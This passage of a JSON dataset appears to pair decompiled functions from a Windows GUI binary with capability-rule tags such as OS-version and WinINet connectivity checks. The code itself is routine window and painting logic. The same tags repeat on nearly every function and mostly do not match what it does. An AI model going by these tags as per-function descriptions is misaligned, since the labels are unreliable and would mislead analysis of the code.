        "decompiled_code": "\nvoid fcn.00459348(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x260) == '\\0') {\n        puStack12 = 0x459367;\n        var_4h = in_EAX;\n        cVar1 = fcn.0044d568();\n        if (cVar1 != '\\0') {\n            uStack16 = 0x459433;\n            uStack20 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffec;\n            *(var_4h + 0x260) = 1;\n            puStack12 = &stack0xfffffffc;\n            cVar1 = fcn.004588c0();\n            if (cVar1 == '\\0') {\n                cVar1 = fcn.004588c0();\n                if (cVar1 == '\\0') {\n                    fcn.00458f50();\n                    fcn.00458f50();\n                }\n                else {\n                    fcn.00458f50();\n                    fcn.00458f50();\n                }\n            }\n            else {\n                fcn.00458f50();\n                fcn.00458f50();\n            }\n            *in_FS_OFFSET = uStack20;\n            *(var_4h + 0x260) = 0;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 336
    },
    "004595ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004595ac(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_1 != param_2) {\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            *(*(in_EAX + 0x250) + 0x1e) = 1;\n            *(*(in_EAX + 0x254) + 0x1e) = 1;\n        }\n        fcn.00458cc8();\n        fcn.00458cc8();\n        if (*(in_EAX + 600) == '\\0') {\n            if (*(*(in_EAX + 0x250) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x250) + 0x10), param_2, param_1);\n                fcn.00458e18();\n            }\n            if (*(*(in_EAX + 0x254) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x254) + 0x10), param_2, param_1);\n                fcn.00458e18();\n            }\n        }\n    }\n    *(*(in_EAX + 0x250) + 0x1e) = 0;\n    *(*(in_EAX + 0x254) + 0x1e) = 0;\n    return;\n}\n",
        "token_count": 342
    },
    "00459a84": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00459a84(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint uVar3;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0045906c();\n    *(in_EAX + 0x50) = *0x459c00;\n    fcn.0045f428();\n    fcn.0045f464();\n    fcn.00444c6c();\n    fcn.00444ca0();\n    piVar2 = fcn.00427be0();\n    *(in_EAX + 0x288) = piVar2;\n    (***0x4929e4)(0x31);\n    (**(*piVar2 + 0x40))();\n    (***0x4929e4)();\n    (**(**(in_EAX + 0x288) + 0x34))();\n    iVar1 = *(in_EAX + 0x288);\n    *(iVar1 + 0x14) = in_EAX;\n    *(iVar1 + 0x10) = fcn.0045a470;\n    *(in_EAX + 0x278) = 2;\n    uVar3 = fcn.00421624();\n    *(in_EAX + 0x280) = uVar3;\n    fcn.00443e20();\n    *(in_EAX + 0x270) = *0x459c04;\n    *(in_EAX + 0x271) = 2;\n    *(in_EAX + 0x273) = 0;\n    *(in_EAX + 0x279) = 3;\n    *(in_EAX + 0x28c) = 0;\n    *(in_EAX + 0x2a4) = *(*0x496588 + 0x40);\n    *(in_EAX + 0x27d) = 1;\n    uVar3 = fcn.00403e30();\n    *(in_EAX + 0xac) = uVar3;\n    *(in_EAX + 0x329) = 0xff;\n    *(in_EAX + 0x354) = 0;\n    fcn.0045a7f4();\n    fcn.00445770();\n    fcn.004456d8();\n    fcn.0044d3a4();\n    fcn.0045fcf0();\n    *(in_EAX + 0x34c) = 10;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = 0x32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 662
    },
    "00459c70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00459c70(void)\n\n{\n    char cVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    int32_t *var_5h;\n    \n    puStack16 = 0x459c7b;\n    *NULL = fcn.00404324();\n    puStack16 = 0x459c8e;\n    var_5h._0_1_ = extraout_DL;\n    fcn.00461340();\n    if ((*(stack0xfffffff8 + 7) & 8) == 0) {\n        puStack16 = 0x459ca3;\n        (**(***0x492cd0 + 0x14))();\n    }\n    uStack20 = 0x459d55;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(stack0xfffffff8 + 0x9f) != '\\0') {\n        puStack16 = &stack0xfffffffc;\n        (**(*stack0xfffffff8 + 0xe8))();\n    }\n    fcn.0045d150();\n    cVar1 = fcn.0044d568();\n    if (cVar1 != '\\0') {\n        (**(*stack0xfffffff8 + 0xb4))();\n    }\n    fcn.0045fd28();\n    fcn.00403f58();\n    fcn.00403f58();\n    fcn.0040e118();\n    fcn.0040e118();\n    fcn.004590e4();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x459d5c;\n    uStack20 = 0x459d54;\n    (**(***0x492cd0 + 0x18))();\n    return;\n}\n",
        "token_count": 436
    },
    "00459d70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00459d70(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x31a) != 0) {\n        uStack28 = 0x459db1;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        (**(in_EAX + 0x318))();\n        *in_FS_OFFSET = uStack32;\n    }\n    if ((*(in_EAX + 0x358) & 2) != 0) {\n        puStack24 = 0x459de6;\n        fcn.0045a7f4();\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "00459dec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00459dec(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x322) != 0) {\n        uStack28 = 0x459e2d;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        (**(in_EAX + 800))();\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "00459fd4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00459fd4(void)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x459fe7;\n    fcn.00449074();\n    uStack24 = 0x45a252;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    *(in_EAX + 0x2b0) = 0;\n    *(in_EAX + 0x2b4) = 0;\n    *(in_EAX + 0x2b8) = 0;\n    bVar1 = false;\n    puStack20 = &stack0xfffffffc;\n    iVar2 = fcn.00403ee4();\n    if (iVar2 == *0x456c00) {\n        *(in_EAX + 0x27c) = *0x4957f1 ^ 1;\n    }\n    fcn.0044869c();\n    if ((*(in_EAX + 0x2a4) != 0) && (0 < *(in_EAX + 0x2b8))) {\n        if (((*(in_EAX + 0x8c) & 0x10) != 0) && (*(in_EAX + 0x2a4) != *(*0x496588 + 0x40))) {\n            uVar3 = fcn.00420eb8(*(*0x496588 + 0x40), *(in_EAX + 0x2a4));\n            sub.kernel32.dll_MulDiv(uVar3);\n            fcn.00420ec0();\n        }\n        *(in_EAX + 0x2a4) = *(*0x496588 + 0x40);\n        iVar2 = fcn.0045a3c0();\n        if (iVar2 != *(in_EAX + 0x2b8)) {\n            bVar1 = true;\n            fcn.004595ac();\n            fcn.00445058();\n            fcn.0044cc80();\n            if ((*(in_EAX + 0x8c) & 4) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x2b0), iVar2, *(in_EAX + 0x2b8));\n                *(in_EAX + 0x2b0) = uVar3;\n            }\n            if ((*(in_EAX + 0x8c) & 8) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x2b4) = uVar3;\n            }\n            if ((*(in_EAX + 0x8c) & 0x20) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x242), iVar2, *(in_EAX + 0x2b8));\n                *(in_EAX + 0x242) = uVar3;\n                uVar3 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x246) = uVar3;\n            }\n        }\n    }\n    if (0 < *(in_EAX + 0x2b0)) {\n        fcn.00444f30();\n    }\n    if (0 < *(in_EAX + 0x2b4)) {\n        fcn.00444f74();\n    }\n    *(in_EAX + 0x8c) = *0x45a260;\n    if (!bVar1) {\n        fcn.004595ac();\n        fcn.0044cc80();\n    }\n    uVar3 = 0;\n    fcn.00446870(0);\n    *in_FS_OFFSET = uVar3;\n    fcn.0044907c(0x45a259);\n    return;\n}\n",
        "token_count": 896
    },
    "0045a384": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0045a384(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        return *(in_EAX + 0x18) >> 0x10;\n    }\n    return *(in_EAX + 0x40);\n}\n",
        "token_count": 96
    },
    "0045a3a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0045a3a4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        return *(in_EAX + 0x18);\n    }\n    return *(in_EAX + 0x44);\n}\n",
        "token_count": 92
    },
    "0045a838": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045a838(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack16 = 0x45a897;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    if (((*(in_EAX + 0x277) == '\\x01') && (*(in_EAX + 0x57) != '\\0')) && (*(in_EAX + 0x30) == 0)) {\n        fcn.00406a50();\n        fcn.0040c5ac();\n        fcn.004047cc();\n    }\n    *in_FS_OFFSET = uStack20;\n    puStack12 = 0x45a89e;\n    uStack16 = 0x45a896;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 234
    },
    "0045a8a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045a8a8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if ((param_2 != in_EAX[0xc]) && (param_2 != in_EAX)) {\n        bVar1 = in_EAX[0xc] == NULL;\n        if (bVar1) {\n            puStack20 = 0x45a8e1;\n            fcn.0044e6dc();\n        }\n        uStack24 = 0x45a958;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        if (bVar1) {\n            puStack20 = &stack0xfffffffc;\n            (**(*in_EAX + 0xb0))();\n        }\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            in_EAX[0x9a] = 0;\n        }\n        in_EAX[0x9b] = 0;\n        fcn.0044e7a4();\n        if (in_EAX[0xc] == 0) {\n            fcn.0044a094();\n        }\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x45a95f;\n        if (bVar1) {\n            uStack24 = 0x45a957;\n            fcn.0044e6dc();\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 383
    },
    "0045a964": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045a964(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0041b994(arg_8h);\n    if (*(in_EAX + 0x298) != 0) {\n        (**(**(in_EAX + 0x298) + 0x30))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "0045a9a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045a9a4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar5 = *param_2;\n    if (iVar5 < 0x47) {\n        if (iVar5 == 0x46) {\n            if (*0x45ae78 == (*(in_EAX + 7) & *0x45ae74)) {\n                if ((*(in_EAX + 0x9e) - 1U < 2) && (*(in_EAX + 0x273) != '\\x02')) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 2;\n                }\n                if (((*(in_EAX + 0x9e) == '\\x01') || (*(in_EAX + 0x9e) == '\\x03')) &&\n                   ((*(in_EAX + 0x271) == '\\x02' || (*(in_EAX + 0x271) == '\\x05')))) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 1;\n                }\n            }\n            goto code_r0x0045ae60;\n        }\n        if (iVar5 - 6U < 3) {\n            if (*0x49173c == '\\0') {\n                return;\n            }\n            if ((*param_2 == 7) && ((*(in_EAX + 7) & 0x10) == 0)) {\n                iVar5 = 0;\n                if (*(in_EAX + 0x277) == '\\x02') {\n                    iVar1 = fcn.0045b758();\n                    if (iVar1 != 0) {\n                        fcn.0045b758();\n                        iVar5 = fcn.0044d1c8();\n                    }\n                }\n                else if ((in_EAX[0x9a] != NULL) && (in_EAX[0x9a] != in_EAX)) {\n                    iVar5 = fcn.0044d1c8();\n                }\n                if (iVar5 != 0) {\n                    sub.user32.dll_SetFocus();\n                    return;\n                }\n            }\n            goto code_r0x0045ae60;\n        }\n        if (iVar5 == 0x2b) {\n            piVar2 = param_2[2];\n            if (((*piVar2 == 1) && (in_EAX[0xa4] != 0)) && (iVar5 = fcn.0043d848(),  iVar5 != 0)) {\n                fcn.00421624();\n                *in_FS_OFFSET = &stack0xffffffd0;\n                sub.gdi32.dll_SaveDC();\n                *in_FS_OFFSET = &stack0xffffffc0;\n                fcn.00421d14();\n                fcn.00421b80();\n                piVar2 = *(piVar2 + 4);\n                puStack72 = 0x45ac78;\n                fcn.0043efd0(piVar2);\n                *in_FS_OFFSET = piVar2;\n                fcn.00421d14();\n                puStack72 = 0x45ac9f;\n                sub.gdi32.dll_RestoreDC();\n                return;\n            }\n            goto code_r0x0045ae60;\n        }\n        if (iVar5 == 0x2c) {\n            piVar2 = param_2[2];\n            if (((*piVar2 == 1) && (in_EAX[0xa4] != 0)) && (piVar3 = fcn.0043d848(),  piVar3 != NULL)) {\n                fcn.0044d1c8();\n                uVar4 = sub.user32.dll_GetWindowDC();\n                *in_FS_OFFSET = &stack0xffffffcc;\n                fcn.00421624();\n                *in_FS_OFFSET = &stack0xffffffc0;\n                puStack72 = 0x45ad42;\n                iVar5 = sub.gdi32.dll_SaveDC();\n                uStack76 = 0x45ada7;\n                piStack80 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb0;\n                puStack72 = &stack0xfffffffc;\n                fcn.00421d14();\n                fcn.00421b80();\n                piVar2 = piVar2 + 4;\n                (**(*piVar3 + 0x38))();\n                *in_FS_OFFSET = piVar2;\n                uStack76 = 0x45adae;\n                piStack80 = 0x45ad99;\n                fcn.00421d14();\n                piStack80 = iVar5;\n                sub.gdi32.dll_RestoreDC(uVar4);\n                return;\n            }\n            goto code_r0x0045ae60;\n        }\n    }\n    else {\n        if (iVar5 == 0xb01a) {\n            if (in_EAX[0x25] != 0) {\n                fcn.00404154();\n            }\n            goto code_r0x0045ae60;\n        }\n        if (iVar5 == 0xb01b) {\n            if (in_EAX[0x25] != 0) {\n                fcn.00404154();\n            }\n            goto code_r0x0045ae60;\n        }\n        if (iVar5 == 0xb047) {\n            iVar5 = param_2[1];\n            iVar1 = 0;\n            while ((iVar5 != 0 && (iVar1 == 0))) {\n                iVar1 = fcn.00441fd4();\n                iVar5 = sub.user32.dll_GetParent();\n            }\n            if (((iVar1 != 0) &&\n                (((piVar2 = fcn.00458424(),  iVar1 != in_EAX[0x9a] || (iVar1 != *(*0x496588 + 100))) && (piVar2 != NULL)\n                 ))) && ((piVar2 == in_EAX || (piVar2 != *(*0x496588 + 0x68))))) {\n                if ((piVar2[0x9a] != 0) && (iVar1 != piVar2[0x9a])) {\n                    fcn.00446870(0);\n                }\n                (**(*piVar2 + 0xf8))();\n            }\n            goto code_r0x0045ae60;\n        }\n    }\n    if (iVar5 == *0x496590) {\n        fcn.00446870(0);\n        fcn.00446870(0);\n        fcn.00446870(0);\n        fcn.00446870(0);\n        fcn.00446870(0);\n        fcn.00446870(0);\n    }\ncode_r0x0045ae60:\n    fcn.0044a5c4();\n    return;\n}\n",
        "token_count": 1609
    },
    "0045aec8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045aec8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.0045b78c();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0045b7d8();\n            if (*(iVar2 + 0x273) == '\\x02') {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 127
    },
    "0045af08": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045af08(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff6c;\n    int32_t iStack140;\n    uint *puStack136;\n    uchar *puStack132;\n    uint *puStack128;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_58h;\n    uint var_4ch;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    iVar2 = *param_2;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (iVar2 != 0xf) {\n        if (iVar2 == 0x14) {\n            fcn.00421508();\n            puStack128 = 0x45af76;\n            (**(*var_4h + 0x44))();\n            puStack128 = &fcn.0045af08::var_6ch;\n            puStack132 = var_8h[1];\n            puStack136 = 0x45af86;\n            sub.user32.dll_FillRect();\n            if ((*(var_4h + 0x277) == '\\x02') && (var_4h[0xa7] != 0)) {\n                puStack136 = &fcn.0045af08::var_5ch;\n                iStack140 = var_4h[0xa7];\n                sub.user32.dll_GetClientRect();\n                uVar1 = fcn.00421508();\n                sub.user32.dll_FillRect(var_8h[1], &fcn.0045af08::var_5ch, uVar1);\n            }\n            var_8h[3] = 1;\n        }\n        else if (iVar2 == 0x3f) {\n            puStack128 = 0x45afe5;\n            fcn.0045ae7c(&stack0xfffffffc);\n            if (*(var_4h + 0x277) == '\\x02') {\n                iVar2 = fcn.0045b78c();\n                if (iVar2 != 0) {\n                    puStack128 = 0x45b008;\n                    fcn.0045aec8(&stack0xfffffffc);\n                }\n                fcn.00457f30();\n            }\n        }\n        else if (iVar2 == 0x84) {\n            puStack128 = 0x45af3f;\n            fcn.0045ae7c(&stack0xfffffffc);\n            if (var_8h[3] == 1) {\n                var_8h[3] = -1;\n            }\n        }\n        else {\n            puStack128 = 0x45b0e3;\n            fcn.0045ae7c(&stack0xfffffffc);\n        }\n        return;\n    }\n    var_ch = param_2[1];\n    if (var_ch == 0) {\n        puStack128 = in_EAX[0xa7];\n        puStack132 = 0x45b048;\n        iVar2 = sub.user32.dll_BeginPaint();\n        var_8h[1] = iVar2;\n    }\n    puStack136 = 0x45b0d6;\n    iStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    puStack132 = &stack0xfffffffc;\n    if (var_ch == 0) {\n        in_stack_ffffff6c = var_4h[0xa7];\n        puStack132 = &stack0xfffffffc;\n        sub.user32.dll_GetWindowRect(in_stack_ffffff6c, &fcn.0045af08::var_5ch);\n        fcn.004450dc();\n        fcn.00443b80();\n    }\n    fcn.0044ab78();\n    *in_FS_OFFSET = in_stack_ffffff6c;\n    iStack140 = 0x45b0e4;\n    if (var_ch == 0) {\n        sub.user32.dll_EndPaint(var_4h[0xa7], &fcn.0045af08::var_4ch);\n    }\n    return;\n}\n",
        "token_count": 956
    },
    "0045b1ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045b1ec(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0xa3) == '\\0') {\n        *(in_EAX + 0xa3) = 1;\n        uStack20 = 0x45b26c;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack24;\n        if (*(in_EAX + 0x18) != '\\0') {\n            if (in_EAX[0xc] == 0) {\n                puStack16 = &stack0xfffffffc;\n                (**(*in_EAX + 0x74))();\n            }\n            else {\n                (**(*in_EAX + 0x74))();\n            }\n            (**(*in_EAX + 0x70))();\n        }\n        *in_FS_OFFSET = uStack24;\n        *(in_EAX + 0xa3) = 0;\n        return;\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "0045b478": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nchar __cdecl fcn.0045b478(uint32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t *in_ECX;\n    uint32_t *in_EDX;\n    \n    *in_EDX = *in_EDX & 0x7f3bff7f;\n    *in_ECX = *in_ECX & 0xfffffe7e;\n    *arg_8h = *arg_8h & 0xffffd7ff;\n    cVar1 = *(in_EAX + 0x271);\n    if ((*(in_EAX + 0x277) == '\\x01') && ((cVar1 == '\\0' || (cVar1 == '\\x03')))) {\n        cVar1 = '\\x02';\n    }\n    // switch table (6 cases) at 0x45b4c6\n    switch(cVar1) {\n    case '\\0':\n        if ((*(in_EAX + 0x30) == 0) && (*(in_EAX + 0x1c4) == 0)) {\n            *in_EDX = *in_EDX | 0x80000000;\n        }\n        break;\n    case '\\x01':\n    case '\\x04':\n        *in_EDX = *in_EDX | 0xc00000;\n        break;\n    case '\\x02':\n    case '\\x05':\n        *in_EDX = *in_EDX | 0xc40000;\n        break;\n    case '\\x03':\n        if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n            *in_EDX = *in_EDX | 0x80c00000;\n        }\n        else {\n            *in_EDX = *in_EDX | 0xc00000;\n        }\n        *in_ECX = *in_ECX | 0x101;\n        if (**0x492a6c == '\\0') {\n            *in_EDX = *in_EDX | 0x400080;\n        }\n        *arg_8h = *arg_8h | 0x2808;\n    }\n    if ((cVar1 - 4U < 2) && (*(in_EAX + 0x277) != '\\x01')) {\n        *in_ECX = *in_ECX | 0x80;\n    }\n    return cVar1 + -6;\n}\n",
        "token_count": 548
    },
    "0045b58c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045b58c(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    if (param_2 != *(in_EAX + 0x271)) {\n        *(in_EAX + 0x271) = param_2;\n        uStack24 = 0x45b5ca;\n        fcn.004592ec();\n        uStack24 = 0x45b5d1;\n        cVar1 = fcn.0044d568();\n        if ((cVar1 != '\\0') && (((*(in_EAX + 7) & 0x10) == 0 || (((*(in_EAX + 7) & 0x10) != 0 && (in_EAX[0xc] != 0))))))\n        {\n            uStack24 = 0xfffffff0;\n            uStack28 = 0x45b5fc;\n            uStack28 = fcn.0044d1c8();\n            uStack32 = 0x45b602;\n            uStack28 = sub.user32.dll_GetWindowLongA();\n            uStack32 = 0xffffffec;\n            uStack36 = 0x45b60e;\n            uStack36 = fcn.0044d1c8();\n            uStack32 = sub.user32.dll_GetWindowLongA();\n            uVar2 = fcn.0044d1c8(0xffffffe6);\n            uStack36 = sub.user32.dll_GetClassLongA(uVar2);\n            puVar4 = &stack0xffffffdc;\n            fcn.00404154(puVar4);\n            fcn.00404154();\n            uVar3 = 0xfffffff0;\n            uVar2 = fcn.0044d1c8(0xfffffff0, puVar4);\n            sub.user32.dll_SetWindowLongA(uVar2);\n            uVar2 = fcn.0044d1c8(0xffffffec, uVar3);\n            sub.user32.dll_SetWindowLongA(uVar2);\n            uVar2 = fcn.0044d1c8(0xffffffe6, uVar3);\n            sub.user32.dll_SetClassLongA(uVar2);\n            uVar2 = fcn.0044d1c8(0, 0, 0, 0, 0, 0x233);\n            sub.user32.dll_SetWindowPos(uVar2);\n            (**(*in_EAX + 0x80))();\n        }\n    }\n    return;\n}\n",
        "token_count": 601
    },
    "0045b758": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
